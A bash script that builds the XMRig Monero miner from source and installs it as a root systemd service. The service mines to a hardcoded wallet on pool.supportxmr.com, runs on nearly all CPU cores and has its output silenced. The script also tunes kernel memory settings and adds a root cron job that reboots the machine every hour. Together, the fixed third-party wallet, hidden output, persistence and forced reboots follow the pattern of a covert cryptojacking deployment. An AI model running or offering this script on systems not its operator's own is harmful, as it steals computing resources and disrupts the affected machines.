#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <WORKER_NAME>"
    exit 1
fi

WORKER="$1"
WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE.$WORKER"
THREADS=$(nproc --ignore=1)

sudo apt update && \
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin && \
echo -e "* soft memlock 262144\n* hard memlock 262144" | sudo tee -a /etc/security/limits.conf && \
grep -q pam_limits.so /etc/pam.d/common-session || echo 'session required pam_limits.so' | sudo tee -a /etc/pam.d/common-session && \
echo 'vm.nr_hugepages=128' | sudo tee -a /etc/sysctl.conf && \
sudo sysctl -w vm.nr_hugepages=128 && \
sudo setcap cap_sys_nice=eip /usr/bin/screen && \
cd ~ && \
git clone https://github.com/xmrig/xmrig.git && \
cd xmrig && mkdir -p build && cd build && \
cmake .. && make -j$(nproc) && \
sudo bash -c "echo -e '[Unit]
Description=XMRig Miner
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/root/xmrig/build/xmrig -o pool.supportxmr.com:443 -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
Restart=always
LimitMEMLOCK=infinity
User=root
WorkingDirectory=/root/xmrig/build
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/xmrig.service" && \
sudo chmod 644 /etc/systemd/system/xmrig.service && \
sudo systemctl daemon-reload && \
sudo systemctl enable xmrig && \
sudo systemctl start xmrig && \
(sudo crontab -l 2>/dev/null; echo "0 * * * * /sbin/reboot") | sudo crontab -
